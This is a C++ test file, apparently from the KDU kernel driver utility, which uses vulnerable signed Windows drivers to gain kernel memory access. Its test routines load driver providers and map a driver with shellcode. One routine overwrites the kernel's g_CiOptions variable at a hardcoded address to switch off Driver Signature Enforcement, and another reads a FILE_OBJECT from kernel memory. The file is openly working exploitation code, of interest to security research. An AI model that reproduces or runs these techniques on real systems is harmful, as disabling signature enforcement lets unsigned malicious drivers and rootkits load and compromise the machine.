/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       TESTS.CPP
*
*  VERSION:     1.12
*
*  DATE:        25 Jan 2022
*
*  KDU tests.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

VOID KDUTestLoad()
{
    ULONG i, c = KDUProvGetCount();
    PKDU_PROVIDER refProv = KDUProvGetReference();
    HINSTANCE hProv = KDUProviderLoadDB();
    ULONG dataSize = 0;
    PVOID pvData;

    for (i = 0; i < c; i++) {

        pvData = KDULoadResource(refProv[i].ResourceId,
            hProv,
            &dataSize,
            PROVIDER_RES_KEY,
            TRUE);

        if (pvData) {
            printf_s("[+] Provider[%lu] loaded\r\n", refProv[i].ResourceId);
            supHeapFree(pvData);
        }
        else {
            printf_s("[+] Provider[%lu] failed to load\r\n", refProv[i].ResourceId);
        }


    }
}

VOID KDUTestDSE(PKDU_CONTEXT Context)
{
    ULONG_PTR g_CiOptions = 0xfffff805fc446d18;
    ULONG_PTR oldValue = 0, newValue = 0x1337, testValue = 0;

    KDUReadKernelVM(Context, g_CiOptions, &oldValue, sizeof(oldValue));
    Beep(0, 0);
    KDUWriteKernelVM(Context, g_CiOptions, &newValue, sizeof(newValue));
    Beep(0, 0);
    KDUReadKernelVM(Context, g_CiOptions, &testValue, sizeof(testValue));
    if (testValue != newValue)
        Beep(1, 1);
    KDUWriteKernelVM(Context, g_CiOptions, &oldValue, sizeof(oldValue));
}

VOID KDUTest()
{
    PKDU_CONTEXT Context;
    ULONG_PTR objectAddress = 0, value;

    UCHAR Buffer[4096];

    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));

    Context = KDUProviderCreate(16, FALSE, 7601, KDU_SHELLCODE_V1, ActionTypeMapDriver);
    if (Context) {

        KDUTestDSE(Context);

        //ULONG64 dummy = 0;

        /*KDUReadKernelVM(Context,
            0xfffff80afbbe6d18,
            &dummy,
            sizeof(dummy));*/

        if (supQueryObjectFromHandle(Context->DeviceHandle, &objectAddress)) {

         /*   Context->Provider->Callbacks.ReadPhysicalMemory(
                Context->DeviceHandle,
                0x1000,
                &Buffer,
                0x1000);
                */
            value = 0x1234567890ABCDEF;

            //objectAddress = 0xfffff80710636d18;

            FILE_OBJECT fileObject;

            RtlSecureZeroMemory(&fileObject, sizeof(FILE_OBJECT));

            KDUReadKernelVM(Context,
                objectAddress,
                &fileObject,
                sizeof(FILE_OBJECT));

            Beep(0, 0);

        }
        
        KDUProviderRelease(Context);
    }
}
